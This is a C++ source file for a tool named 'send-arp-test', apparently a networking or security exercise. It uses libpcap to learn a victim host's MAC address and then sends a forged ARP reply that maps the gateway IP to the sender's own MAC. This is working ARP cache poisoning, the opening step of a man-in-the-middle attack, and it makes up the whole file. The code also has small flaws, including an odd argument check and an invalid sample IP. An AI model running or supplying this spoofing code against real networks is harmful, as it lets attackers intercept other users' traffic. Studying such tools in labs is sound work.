#include <cstdio>
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"
#include <stdio.h>
#include <string.h>
#include <sys/ioctl.h>
#include <net/if.h>

#pragma pack(push, 1)
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

void usage() {
	printf("syntax: send-arp-test <interface> <victim-ip> <gw ip>\n");
	printf("sample: send-arp-test wlan0 192.168.1.24 41.512.42.1\n");
}

int main(int argc, char* argv[]) {
	if (argc >= 4 and (argc-2) % 2 != 0 ) {
		usage();
		return -1;
	}
	int set = argc/2-1;
	for(int i=0;i<set;i++) {
		char* dev = argv[1]; // ethernet
		char* victim_ip = argv[2+2*i];
		char* gw_ip = argv[3+2*i];
		char errbuf[PCAP_ERRBUF_SIZE];
		Mac victim_mac;
		pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf); //add bufsize
		if (handle == nullptr) {
			fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
			return -1;
		}
		
		// get my mac & ip address
		struct ifreq s;
		char my_mac[20];
		char my_ip[20];
		int fd = socket(PF_INET, SOCK_DGRAM, IPPROTO_IP);
		strcpy(s.ifr_name, dev);
		if (0 == ioctl(fd, SIOCGIFHWADDR, &s)) {
			int i;
			sprintf(my_mac, "%02X:%02X:%02X:%02X:%02X:%02X", (unsigned char)s.ifr_addr.sa_data[0],(unsigned char)s.ifr_addr.sa_data[1],(unsigned char)s.ifr_addr.sa_data[2],(unsigned char)s.ifr_addr.sa_data[3],(unsigned char)s.ifr_addr.sa_data[4],(unsigned char)s.ifr_addr.sa_data[5]);
			//printf("%s\n", my_mac);
			//printf("%s\n", victim_ip);
	 
	    		fd = socket(AF_INET, SOCK_DGRAM, 0);
	    		s.ifr_addr.sa_family = AF_INET;
	    		strncpy(s.ifr_name , dev , IFNAMSIZ - 1);
	    		ioctl(fd, SIOCGIFADDR, &s);
	    		sprintf(my_ip,"%s",inet_ntoa(( (struct sockaddr_in *)&s.ifr_addr )->sin_addr));
	    		//printf("%s\n",my_ip);
		}
		
		EthArpPacket packet;
		
		// first. ask sender mac with sender ip using arp request
		packet.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff"); // target mac ff -> get mac address
		packet.eth_.smac_ = Mac(my_mac); // my kali mac addr
		packet.eth_.type_ = htons(EthHdr::Arp);

		packet.arp_.hrd_ = htons(ArpHdr::ETHER);
		packet.arp_.pro_ = htons(EthHdr::Ip4);
		packet.arp_.hln_ = Mac::SIZE;
		packet.arp_.pln_ = Ip::SIZE;
		packet.arp_.op_ = htons(ArpHdr::Request); // Request -> Reply
		packet.arp_.smac_ = Mac(my_mac); //sender(me) kali mac addr
		
		packet.arp_.sip_ = htonl(Ip(my_ip)); // gw ip
		packet.arp_.tmac_ = Mac("00:00:00:00:00:00"); //target mac  00 -> get mac
		packet.arp_.tip_ = htonl(Ip(victim_ip)); //target ip
		int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
		if (res != 0) {
			fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
		}

		while(true){
			struct pcap_pkthdr* header;
			const u_char* packet;
			struct EthHdr* eth_h;
			struct ArpHdr* arp_h;
			res = pcap_next_ex(handle, &header, &packet);
			if (res == 0) continue;
			if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
				printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
				break;
			}
			eth_h = (struct EthHdr*)packet;
			int eth_len = sizeof(struct EthHdr);
			
			arp_h = (struct ArpHdr*)(packet+eth_len);
			
			if(eth_h->type() == 0x0806 && arp_h->op() == 2){
				if(arp_h->tmac() == Mac(my_mac) && arp_h->sip() == Ip(victim_ip)){
					victim_mac = arp_h -> smac();
					break;
				}
				else continue;
			}
			else continue;
		}
		// send arp reply with victim_mac
		packet.eth_.dmac_ = victim_mac; // target mac 
		packet.eth_.smac_ = Mac(my_mac); // my kali mac addr
		packet.eth_.type_ = htons(EthHdr::Arp);

		packet.arp_.hrd_ = htons(ArpHdr::ETHER);
		packet.arp_.pro_ = htons(EthHdr::Ip4);
		packet.arp_.hln_ = Mac::SIZE;
		packet.arp_.pln_ = Ip::SIZE;
		packet.arp_.op_ = htons(ArpHdr::Reply); // Request -> Reply
		packet.arp_.smac_ = Mac(my_mac); //sender(me) kali mac addr
		
		packet.arp_.sip_ = htonl(Ip(gw_ip)); // gw ip
		packet.arp_.tmac_ = victim_mac; //target mac  00 -> get mac
		packet.arp_.tip_ = htonl(Ip(victim_ip)); //target ip
		res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
		if (res != 0) {
			fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
		}
		pcap_close(handle);
	}
}
